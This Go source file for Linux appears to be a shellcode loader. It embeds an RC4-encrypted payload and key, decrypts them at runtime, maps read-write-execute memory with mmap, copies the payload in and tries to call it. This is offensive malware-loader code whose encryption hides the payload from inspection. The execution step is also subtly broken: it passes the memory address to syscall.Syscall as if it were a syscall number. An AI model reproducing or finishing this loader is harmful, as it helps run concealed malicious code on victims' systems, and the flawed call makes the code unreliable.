//go:build linux
// +build linux

package exec

import (
	"crypto/rc4"
	_ "embed"
	"errors"
	"fmt"
	"syscall"
	"unsafe"
)

// ==============================
// Embedded shellcode + key
// ==============================

//go:embed loader_encrypted.bin
var encryptedShellcode []byte

//go:embed key.txt
var rc4Key []byte

// ==============================
// Decrypt embedded shellcode
// ==============================

func Decrypt() ([]byte, error) {
	c, err := rc4.NewCipher(rc4Key)
	if err != nil {
		return nil, fmt.Errorf("rc4 init failed: %w", err)
	}
	if len(encryptedShellcode) == 0 {
		return nil, errors.New("no embedded shellcode")
	}
	dec := make([]byte, len(encryptedShellcode))
	c.XORKeyStream(dec, encryptedShellcode)
	return dec, nil
}

// ==============================
// Execute shellcode inline (Linux)
// ==============================

func Execute(sc []byte) error {
	if len(sc) == 0 {
		return errors.New("no shellcode to execute")
	}

	// Allocate RWX memory with mmap
	prot := syscall.PROT_READ | syscall.PROT_WRITE | syscall.PROT_EXEC
	flags := syscall.MAP_ANONYMOUS | syscall.MAP_PRIVATE

	addr, _, errno := syscall.Syscall6(
		syscall.SYS_MMAP,
		0,
		uintptr(len(sc)),
		uintptr(prot),
		uintptr(flags),
		0,
		0,
	)
	if errno != 0 {
		return fmt.Errorf("mmap failed: %v", errno)
	}

	// Copy shellcode into allocated memory
	mem := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(sc))
	copy(mem, sc)

	// Invoke shellcode at addr. Syscall signature: Syscall(trap uintptr, a1, a2, a3 uintptr)
	_, _, callErr := syscall.Syscall(addr, 0, 0, 0)
	if callErr != 0 {
		return fmt.Errorf("calling shellcode failed: %v", callErr)
	}

	return nil
}
